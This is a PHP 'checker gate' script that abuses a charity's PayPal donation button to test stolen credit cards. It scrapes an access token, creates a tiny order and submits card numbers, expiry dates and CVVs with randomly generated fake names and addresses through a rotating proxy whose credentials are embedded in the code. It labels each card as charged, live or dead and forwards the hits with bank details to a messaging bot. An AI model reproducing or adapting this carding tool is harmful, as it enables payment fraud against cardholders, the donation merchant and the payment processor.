<?php



$gate ='PAYPAL AUTH' ;
require '../Misc/Function.php';
require '../Misc/RandomInfo.php';
require '../Misc/BinLookup.php';
require '../Misc/ua.php';
//require 'Misc/GoogleRecapchaV3.php';
$pix = 'xbxeeexu-rotate:r9kczpek2fx6@p.webshare.io:80';
/////////////////////////////////

error_reporting(1);
set_time_limit(0); 
date_default_timezone_set('America/Buenos_Aires'); 

#//////////[COOKIE JAR]//////////#

if (file_exists(getcwd().('/../clir/paypal.txt'))){@unlink('paypal.txt');};
function Capture2($str, $starting_word, $ending_word)
    {
        $subtring_start  = strpos($str, $starting_word);
        $subtring_start += strlen($starting_word);
        $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
        return substr($str, $subtring_start, $size);
    }


    $mes = ltrim($mes, '0');
    $ano = strlen($ano) == 2 ? '20' . $ano : $ano;


    $firstname = ucfirst(str_shuffle('anthonysudiaj'));
    $lastname = ucfirst(str_shuffle('pitoshduajdb'));
    $street = "" . rand(0000, 9999) . " Main Street";
    $ph = array("682", "346", "246");
    $ph1 = array_rand($ph);
    $phh = $ph[$ph1];
    $phone = "$phh" . rand(0000000, 9999999) . "";
    $email = 'anthoyn' . $firstname . 'us82j37' . $phone . '@gmail.com';
    $st = array("AL", "NY", "CA", "FL", "WA");
    $st1 = array_rand($st);
    $statee = $st[$st1];
    if ($statee == "NY") {
        $state = $statee;
        $postcode = "10080";
        $city = "New York";
    } elseif ($statee == "WA") {
        $state = $statee;
        $postcode = "98001";
        $city = "Auburn";
    } elseif ($statee == "AL") {
        $state = $statee;
        $postcode = "35005";
        $city = "Adamsville";
    } elseif ($statee == "FL") {
        $state = $statee;
        $postcode = "32003";
        $city = "Orange Park";
    } else {
        $state = $statee;
        $postcode = "90201";
        $city = "Bell";
    };



    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/buttons?locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'referer: https://onehealthworkforceacademies.org/',
        'sec-fetch-dest: iframe',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: cross-site',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_PROXY, $pix);

    curl_setopt($ch, CURLOPT_COOKIEFILE, 'ppauth.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'ppauth.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true');
    $r1 = curl_exec($ch);
    curl_close($ch);
    $bearer = getstr($r1, 'facilitatorAccessToken":"', '"');


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/v2/checkout/orders');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authority: www.paypal.com',
        'method: POST',
        'path: /v2/checkout/orders',
        'scheme: https',
        'accept: application/json',
        'accept-language: es-ES,es;q=0.9',
        'authorization: Bearer ' . $bearer . '',
        'content-type: application/json',
        'origin: https://www.paypal.com',
        'paypal-partner-attribution-id',
        'prefer: return=representation',
        'referer: https://www.paypal.com/smart/buttons?locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $pix);

    curl_setopt($ch, CURLOPT_COOKIEFILE, 'ppauth.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'ppauth.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"purchase_units":[{"amount":{"currency_code":"MXN","value":"1"},"description":"Donativo único","custom_id":"Referencia: Donativo único. Acerca del donativo: ","item_list":{"items":[{"name":"FDUM","description":"FDUM description"}]}}],"intent":"CAPTURE","application_context":{}}');

    $r2 = curl_exec($ch);
    curl_close($ch);
    $orden = getstr($r2, 'id":"', '"');

 

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authority: www.paypal.com',
        'method: POST',
        'path: /graphql?fetch_credit_form_submit',
        'scheme: https',
        'accept: */*',
        'accept-language: es-ES,es;q=0.9',
        'content-type: application/json',
        'origin: https://www.paypal.com',
        'paypal-client-context: ' . $orden . '',
        'paypal-client-metadata-id: ' . $orden . '',
        'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_58937796db_mtm6nte6ntm&buttonSessionID=uid_93ad78f223_mtm6nte6ntm&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&disable-card=&token=' . $orden . '',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-app-name: standardcardfields',
        'x-country: US',
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $pix);

    curl_setopt($ch, CURLOPT_COOKIEFILE, 'ppauth.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'ppauth.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"' . $orden . '","card":{"cardNumber":"' . $cc . '","expirationDate":"' . $mes . '/' . $ano . '","postalCode":"' . $postcode . '","securityCode":"' . $cvv . '"},"phoneNumber":"' . $phone . '","firstName":"' . $firstname . ' ","lastName":"' . $lastname . '","billingAddress":{"givenName":"' . $firstname . ' ","familyName":"' . $lastname . '","line1":"' . $street . '","line2":null,"city":"' . $city . '","state":"' . $state . '","postalCode":"' . $postcode . '","country":"US"},"shippingAddress":{"givenName":"' . $firstname . ' ","familyName":"' . $lastname . '","line1":"' . $street . '","line2":null,"city":"' . $city . '","state":"' . $state . '","postalCode":"' . $postcode . '","country":"US"},"email":"' . $email . '","currencyConversionType":"VENDOR"},"operationName":null}');

    $r3 = curl_exec($ch);
    curl_close($ch);
    $code = getstr($r3, 'code":"', '"');
    $msg = getstr($r3, 'message":"', '"');

    if (
        strpos($r3, '"status": "succeeded"') ||
        strpos($r3, 'Thank You For Donation.') ||
        strpos($r3, 'Your payment has already been processed') ||
        strpos($r3, 'Success ') ||
        strpos($r3, 'EXISTING_ACCOUNT_RESTRICTED') ||
        strpos($r3, '/donations/thank_you?donation_number=')
    ) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "CARD LOADED";
        $code = "CHARGED 0.01$ SUCCESSFULLY 🟢";
        echo '<font size=3.5 color="white"><font class="badge badge-success">#HIT </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ '.$code.' ★ 』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Country:  '.$flag.''.$country.'  </font> <font class="badge badge-secondary"> Brand:  '.$level.'  </font> <font class="badge badge-secondary"> Card:   '.$vendor.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">'.$credits.'</font><br></br>';
        $message = "-------[Card]-------
        CC:- $lista
        RESPONSE: $code
        ------[Bin Info]-----
        BIN: $bin
        BANK: $bank
        COUNTRY: $flag$country
        BRAND: $vendor
        LEVEL: $level
        TYPE: $type
        GATE: $gate";
send_message($chid, $apiToken, $message);    } elseif (strpos($r3, 'INVALID_BILLING_ADDRESS')) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "INVALID BILLING ADDRESS";
        $code = "AVS LIVE 🟢";
        echo '<font size=3.5 color="white"><font class="badge badge-success">#CVV </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ '.$code.' ★ 』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Country:  '.$flag.''.$country.'  </font> <font class="badge badge-secondary"> Brand:  '.$level.'  </font> <font class="badge badge-secondary"> Card:   '.$vendor.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">'.$credits.'</font><br></br>';
        $message = "-------[Card]-------
        CC:- $lista
        RESPONSE: $code
        ------[Bin Info]-----
        BIN: $bin
        BANK: $bank
        COUNTRY: $flag$country
        BRAND: $vendor
        LEVEL: $level
        TYPE: $type
        GATE: $gate";
send_message($chid, $apiToken, $message);    } elseif (strpos($r3, 'INVALID_SECURITY_CODE')) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "INVALID SECURITY CODE";
        $code = "CCN LIVE  🟢";
        echo '<font size=3.5 color="white"><font class="badge badge-success">#CCN </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ '.$code.' ★ 』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Country:  '.$flag.''.$country.'  </font> <font class="badge badge-secondary"> Brand:  '.$level.'  </font> <font class="badge badge-secondary"> Card:   '.$vendor.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">'.$credits.'</font><br></br>';
$message = "-------[Card]-------
    CC:- $lista
    RESPONSE: $code
    ------[Bin Info]-----
    BIN: $bin
    BANK: $bank
    COUNTRY: $flag$country
    BRAND: $vendor
    LEVEL: $level
    TYPE: $type
    GATE: $gate";
send_message($chid, $apiToken, $message);    
} 
 elseif (strpos($r3, 'CARD_GENERIC_ERROR')) {
        $es = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
        $msg = "ISSUER_DECLINE";
        $code = "CARD_GENERIC_ERROR";
        echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ '.$code.'  ★ 』</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Country:  '.$flag.''.$country.'  </font> <font class="badge badge-secondary"> Brand:  '.$level.'  </font> <font class="badge badge-secondary"> Card:   '.$vendor.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">'.$credits.'</font><br></br>';
    } else {
        $es = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
        echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ '.$code.'  ★ 』</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Country:  '.$flag.''.$country.'  </font> <font class="badge badge-secondary"> Brand:  '.$level.'  </font> <font class="badge badge-secondary"> Card:   '.$vendor.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">'.$credits.'</font><br></br>';  
  }

